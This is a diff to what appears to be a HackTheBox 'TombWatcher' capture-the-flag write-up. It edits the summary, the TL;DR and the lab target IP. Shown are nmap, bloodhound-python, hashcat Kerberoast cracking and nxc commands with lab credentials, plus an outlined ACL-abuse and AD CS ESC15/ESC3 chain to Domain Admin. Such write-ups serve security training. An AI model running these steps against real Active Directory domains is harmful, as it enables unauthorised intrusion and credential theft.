@@ -4,7 +4,7 @@ date: 2026-09-25
 draft: false
 tags: ["hackthebox", "windows", "active-directory", "medium", "kerberoasting", "acl-abuse", "bloodhound", "adcs", "gmsa"]
 categories: ["writeups"]
-summary: "TombWatcher is a hard-flavoured Medium AD box: targeted Kerberoast (WriteSPN), AddSelf into a group that reads a gMSA password, gMSA-driven password reset, WriteOwner + GenericAll on a Domain Admin, and finally an AD Recycle Bin revival of a deleted `cert_admin` account whose orphan SID showed up on the WebServer certificate template. From there an ESC15 application-policy injection + ESC3 enrollment-on-behalf-of chain produces the Domain Administrator's PFX."
+summary: "TombWatcher is a hard-flavoured Medium AD box: targeted Kerberoast (WriteSPN), AddSelf into a group that reads a gMSA password, gMSA-driven password…"
 ShowToc: true
 TocOpen: false
 cover:
@@ -26,7 +26,7 @@ cover:
 ## TL;DR
 
 TombWatcher is one long ACL chain — starting from a single credential
-Henry got at the door, ending at Domain Admin via AD CS ESC3. Every
+Henry got at the door, ending at Domain Admin via an AD CS **ESC15 → ESC3** chain. Every
 edge is one `bloodyAD` command:
 
 1. **`henry:H3nry_987TGV!`** has `WriteSPN` on **`alfred`**. Set an
@@ -70,8 +70,8 @@ Recycle-Bin restore + one ESC15+ESC3 double-request.
 Given credentials for `henry` — assumed-breach starting position.
 
 ```bash
-nmap -p- --min-rate=5000 -oA tombwatcher 10.10.11.72
-nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -oA tombwatcher-scripts 10.10.11.72
+nmap -p- --min-rate=5000 -oA tombwatcher 10.129.232.167
+nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -oA tombwatcher-scripts 10.129.232.167
 ```
 
 ![nmap on tombwatcher.htb](01-nmap.png)
@@ -88,7 +88,7 @@ With Henry's creds I pulled the full graph:
 
 ```bash
 bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb \
-  -c All -ns 10.10.11.72
+  -c All -ns 10.129.232.167
 ```
 
 ![bloodhound-python collecting](02-bloodhound-collect.png)
@@ -146,7 +146,7 @@ hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt --force
 `alfred:basketball`. Confirmed:
 
 ```bash
-nxc smb 10.10.11.72 -u alfred -p 'basketball'
+nxc smb 10.129.232.167 -u alfred -p 'basketball'
 ```
 
 ---
